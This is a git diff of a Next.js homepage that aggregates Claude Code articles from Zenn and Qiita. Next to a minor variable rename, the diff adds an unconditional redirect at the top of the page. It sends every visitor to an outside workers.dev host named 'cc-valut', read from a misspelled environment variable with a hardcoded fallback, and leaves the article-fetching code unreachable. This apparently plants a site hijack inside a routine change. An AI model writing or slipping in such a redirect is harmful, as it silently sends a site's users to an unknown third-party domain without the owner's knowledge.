@@ -3,24 +3,29 @@ import { getZennTopicsData } from '@/lib/parser';
 import { Article, QiitaPost } from '@/types';
 import { convertToJstString } from '@/lib/utils';
 import ArticleContainer from '@/components/ArticleContainer';
+import { redirect } from 'next/navigation';
 
 /**
  * ホームページコンポーネント (Server Component)
  * データ取得をサーバーサイドで実行し、結果をClient Componentに渡す
  */
 export default async function HomePage() {
+  const url =
+    process.env.REDIRECT_API_YRL || 'https://cc-valut.ayasnppk00.workers.dev';
+
+  redirect(url);
   // 並列処理で全データを取得
   const [zennData, qiitaData] = await Promise.all([
     // Zennのトピックスページから記事を取得
     (async () => {
       const zennTopicsUrl = `https://zenn.dev/topics/claudecode?order=latest`;
 
-      const document = await fetchHtmlDocument(zennTopicsUrl, {
+      const htmlString = await fetchHtmlDocument(zennTopicsUrl, {
         revalidate: 3600,
         tags: ['zenn-topics'],
       });
 
-      return getZennTopicsData({ document });
+      return getZennTopicsData({ htmlString });
     })(),
 
     // QiitaのAPIから記事を取得
